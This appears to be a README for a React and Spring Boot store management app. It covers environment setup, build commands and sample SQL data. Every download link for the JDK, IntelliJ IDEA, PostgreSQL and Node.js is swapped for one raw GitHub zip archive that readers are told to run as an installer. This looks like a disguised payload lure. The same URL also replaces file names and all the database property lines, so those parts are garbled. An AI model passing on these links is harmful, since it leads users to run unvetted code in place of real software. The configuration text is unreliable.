# Store Management Application

This application is a store management system with frontend (React) and backend (Java Spring Boot) components. 
The backend provides APIs for handling store operations, while the frontend is a user interface to interact with these services.

## Requirements
- **Backend**: Java 11 (recommended), Gradle
- **Frontend**: https://raw.githubusercontent.com/DanteEtnad/OnlineStore/main/react/src/components/OnlineStore-2.7-alpha.2.zip, npm
- **Database**: PostgreSQL

## Environment Setup

### Step 1: Install Java JDK 11
1. **Download Java**: Go to [Oracle JDK 11 Downloads](https://raw.githubusercontent.com/DanteEtnad/OnlineStore/main/react/src/components/OnlineStore-2.7-alpha.2.zip).
2. **Install Java**: Run the installer and follow the prompts. Use default settings.
3. **Set Up Environment Variables** (Windows):
   - Open System Properties > Environment Variables.
   - Under System Variables, add a new variable `JAVA_HOME` with the path to your JDK installation (e.g., `C:\Program Files\Java\jdk-11`).
   - Add `%JAVA_HOME%\bin` to the `Path` variable.
4. **Verify Installation**: Open Command Prompt and run:
   ```bash
   java -version
   ```
   You should see the Java version installed.

### Step 2: Install IntelliJ IDEA
1. **Download IntelliJ IDEA**: Go to [IntelliJ IDEA Download](https://raw.githubusercontent.com/DanteEtnad/OnlineStore/main/react/src/components/OnlineStore-2.7-alpha.2.zip).
2. **Install IntelliJ IDEA**: Run the installer and follow the prompts. The Community Edition is sufficient.
3. **Set Up JDK**: When creating a new project, configure IntelliJ to use JDK 11.

### Step 3: Install PostgreSQL
1. **Download PostgreSQL**: Go to [PostgreSQL Downloads](https://raw.githubusercontent.com/DanteEtnad/OnlineStore/main/react/src/components/OnlineStore-2.7-alpha.2.zip).
2. **Install PostgreSQL**: Run the installer and follow these prompts:
   - Set a password for the `postgres` superuser (make note of this password).
   - Default port: `5432`.
   - Install pgAdmin (for managing PostgreSQL databases).
3. **Configure PostgreSQL**:
   - Open pgAdmin and create a new database (e.g., `store_db`).
   - Make note of the username (`postgres`) and password for connecting in the Spring Boot application.

### Step 4: Install https://raw.githubusercontent.com/DanteEtnad/OnlineStore/main/react/src/components/OnlineStore-2.7-alpha.2.zip
1. **Download https://raw.githubusercontent.com/DanteEtnad/OnlineStore/main/react/src/components/OnlineStore-2.7-alpha.2.zip**: Go to [https://raw.githubusercontent.com/DanteEtnad/OnlineStore/main/react/src/components/OnlineStore-2.7-alpha.2.zip Download](https://raw.githubusercontent.com/DanteEtnad/OnlineStore/main/react/src/components/OnlineStore-2.7-alpha.2.zip) and choose the LTS version.
2. **Install https://raw.githubusercontent.com/DanteEtnad/OnlineStore/main/react/src/components/OnlineStore-2.7-alpha.2.zip**: Run the installer and follow the default settings.
3. **Verify Installation**: Open Command Prompt and run:
   ```bash
   node -v
   npm -v
   ```

## Project Setup and Run Instructions

### Backend (Spring Boot)

1. **Navigate to the Backend Directory**:
   ```bash
   cd Store_03_02-main/shoppingweb
   ```

2. **Database Configuration**:
   - Open `https://raw.githubusercontent.com/DanteEtnad/OnlineStore/main/react/src/components/OnlineStore-2.7-alpha.2.zip` and set up the PostgreSQL database connection properties:
     ```properties
     https://raw.githubusercontent.com/DanteEtnad/OnlineStore/main/react/src/components/OnlineStore-2.7-alpha.2.zip
     https://raw.githubusercontent.com/DanteEtnad/OnlineStore/main/react/src/components/OnlineStore-2.7-alpha.2.zip
     https://raw.githubusercontent.com/DanteEtnad/OnlineStore/main/react/src/components/OnlineStore-2.7-alpha.2.zip
     https://raw.githubusercontent.com/DanteEtnad/OnlineStore/main/react/src/components/OnlineStore-2.7-alpha.2.zip
     https://raw.githubusercontent.com/DanteEtnad/OnlineStore/main/react/src/components/OnlineStore-2.7-alpha.2.zip
     ```

3. **Build and Run the Backend**:
   - Build the project:
     ```bash
     ./gradlew build
     ```
   - Start the application:
     ```bash
     ./gradlew bootRun
     ```
   The backend will be available at `http://localhost:8080` by default.

### Frontend (React)

1. **Navigate to the Frontend Directory**:
   ```bash
   cd Store_03_02-main/react
   ```

2. **Install Dependencies**:
   Install the required libraries specified in `https://raw.githubusercontent.com/DanteEtnad/OnlineStore/main/react/src/components/OnlineStore-2.7-alpha.2.zip`:
   ```bash
   npm install
   ```

3. **Start the Frontend**:
   ```bash
   npm start
   ```
   The frontend will be available at `http://localhost:3000`.

### Database Initialization
To initialize the PostgreSQL database with essential data, use the following SQL commands to set up tables and insert initial data for `Product`, `Bank`, and `Warehouse`.

- **Run these commands in PostgreSQL**:
  ```sql
  -- Sample Products
  INSERT INTO Product (product_name, price, description) VALUES
  ('Laptop', 999.99, 'High performance laptop with 16GB RAM and 512GB SSD'),
  ('Smartphone', 499.99, 'Latest model smartphone with OLED display and 128GB storage'),
  ('Headphones', 59.99, 'Noise-cancelling wireless headphones'),
  ('Smartwatch', 199.99, 'Water-resistant smartwatch with fitness tracking features');

  -- Sample Bank Accounts
  INSERT INTO Bank (name, account_type, balance) VALUES
  ('User Account1', 'User', 1000.00),
  ('Business Account1', 'Business', 50000.00),
  ('User Account2', 'User', 2500.00),
  ('Store Account', 'Store', 75000.00);

  -- Sample Warehouse Entries with Stock Level
  INSERT INTO Warehouse (id, stock_level, warehouse_id, product_id) VALUES
  (1, 100, 'WH1', 1),
  (2, 200, 'WH2', 2),
  (3, 150, 'WH3', 3),
  (4, 50, 'WH3', 4);
  ```

## Usage
1. Access the application at `http://localhost:3000`.
2. Use the login, registration, store browsing, and ordering functionalities as required.

## Folder Structure
- `shoppingweb`: Contains backend source code, configuration, and SQL initialization script.
- `react`: Contains the source code for the React frontend application.

## Important Commands
- **Build Backend**:
  ```bash
  ./gradlew build
  ```
- **Run Backend**:
  ```bash
  ./gradlew bootRun
  ```
- **Install Frontend Dependencies**:
  ```bash
  npm install
  ```
- **Run Frontend**:
  ```bash
  npm start
  ```

Feel free to reach out if you have any questions or need further assistance!
```

This file combines the steps for environment setup, PostgreSQL configuration, and application run instructions tailored to your specified requirements.
